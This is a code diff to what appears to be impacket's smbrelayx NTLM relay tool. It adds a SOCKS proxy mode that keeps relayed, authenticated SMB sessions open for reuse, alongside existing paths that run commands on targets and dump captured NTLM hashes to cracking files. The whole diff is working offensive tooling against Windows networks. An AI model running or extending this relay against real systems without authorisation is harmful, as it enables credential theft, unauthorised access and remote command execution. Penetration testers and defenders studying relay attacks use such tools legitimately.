@@ -66,6 +66,7 @@ from impacket.smbconnection import SMBConnection
 from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile, SMBSERVER
 from impacket.spnego import ASN1_AID, SPNEGO_NegTokenResp, SPNEGO_NegTokenInit
 from impacket.dcerpc.v5.rpcrt import DCERPCException
+from impacket.examples.ntlmrelayx.utils.socks import activeConnections, SOCKS
 
 try:
  from Crypto.Cipher import DES, AES, ARC4
@@ -619,6 +620,9 @@ class HTTPRelayServer(Thread):
     def setCommand(self, command):
         self.command = command
 
+    def setSocks(self, socks):
+        self.runSocks = socks
+
     def setReturnStatus(self, returnStatus):
         # Not implemented yet.
         pass
@@ -652,6 +656,7 @@ class SMBRelayServer(Thread):
         self.returnStatus = STATUS_SUCCESS
         self.command = None
         self.one_shot = False
+        self.runSocks = False
 
         # Here we write a mini config for the server
         smbConfig = ConfigParser.ConfigParser()
@@ -889,13 +894,20 @@ class SMBRelayServer(Thread):
                     if self.server.getJTRdumpPath() != '':
                         writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                               self.server.getJTRdumpPath())
-                    del (smbData[self.target])
 
                     # Target will be attacked, adding to the attacked set
                     # If the attack fails, the doAttack thread will be responsible of removing it from the set
                     ATTACKED_HOSTS.add(self.target)
-                    clientThread = doAttack(smbClient,self.exeFile,self.command)
-                    clientThread.start()
+                    if self.runSocks is True:
+                        # Pass all the data to the socks proxy
+                        activeConnections.put((self.target, 445, authenticateMessage['user_name'], smbClient, connData))
+                        logging.info("Adding %s(445) to active SOCKS connection. Enjoy" % self.target)
+                        del (smbData[self.target])
+                    else:
+                        del (smbData[self.target])
+                        clientThread = doAttack(smbClient,self.exeFile,self.command)
+                        clientThread.start()
+
 
                     # Now continue with the server
                 #############################################################
@@ -967,13 +979,20 @@ class SMBRelayServer(Thread):
                 if self.server.getJTRdumpPath() != '':
                     writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                           self.server.getJTRdumpPath())
-                # Remove the target server from our connection list, the work is done
-                del (smbData[self.target])
                 # Target will be attacked, adding to the attacked set
                 # If the attack fails, the doAttack thread will be responsible of removing it from the set
                 ATTACKED_HOSTS.add(self.target)
-                clientThread = doAttack(smbClient, self.exeFile, self.command)
-                clientThread.start()
+                if self.runSocks is True:
+                    # Pass all the data to the socks proxy
+                    activeConnections.put((self.target, 445, smbClient, connData))
+                    logging.info("Adding %s(445) to active SOCKS connection. Enjoy" % self.target)
+                    # Remove the target server from our connection list, the work is done
+                    del (smbData[self.target])
+                else:
+                    # Remove the target server from our connection list, the work is done
+                    del (smbData[self.target])
+                    clientThread = doAttack(smbClient, self.exeFile, self.command)
+                    clientThread.start()
                 # Now continue with the server
 
 
@@ -1017,6 +1036,9 @@ class SMBRelayServer(Thread):
 
     def setCommand(self, command):
         self.command = command
+
+    def setSocks(self, socks):
+        self.runSocks = socks
 
     def setReturnStatus(self, returnStatus):
         # Specifies return status after successful relayed authentication to return
@@ -1065,6 +1087,8 @@ if __name__ == '__main__':
     parser.add_argument('-c', action='store', type=str, required=False, metavar='COMMAND',
                         help='Command to execute on target system. If not specified, hashes will be dumped '
                              '(secretsdump.py must be in the same directory)')
+    parser.add_argument('-socks', action='store_true', default=False,
+                        help='Launch a SOCKS proxy for the connection relayed')
     parser.add_argument('-one-shot', action='store_true', default=False,
                         help='After successful authentication, only execute the attack once for each target')
     parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
@@ -1094,6 +1118,8 @@ if __name__ == '__main__':
         logging.getLogger().setLevel(logging.DEBUG)
     else:
         logging.getLogger().setLevel(logging.INFO)
+        logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)
+
 
     if options.h is not None:
         logging.info("Running in relay mode")
@@ -1108,11 +1134,19 @@ if __name__ == '__main__':
     Command = options.c
     returnStatus = options.s
 
+    if options.socks is True:
+        # Start a SOCKS proxy in the background
+        s = SOCKS()
+        socks_thread = Thread(target=s.serve_forever)
+        socks_thread.daemon = True
+        socks_thread.start()
+
     for server in RELAY_SERVERS:
         s = server(options.outputfile)
         s.setTargets(targetSystem)
         s.setExeFile(exeFile)
         s.setCommand(Command)
+        s.setSocks(options.socks)
         s.setReturnStatus(returnStatus)
         s.setMode(mode, options.one_shot)
         if options.machine_account is not None and options.machine_hashes is not None and options.domain is not None:
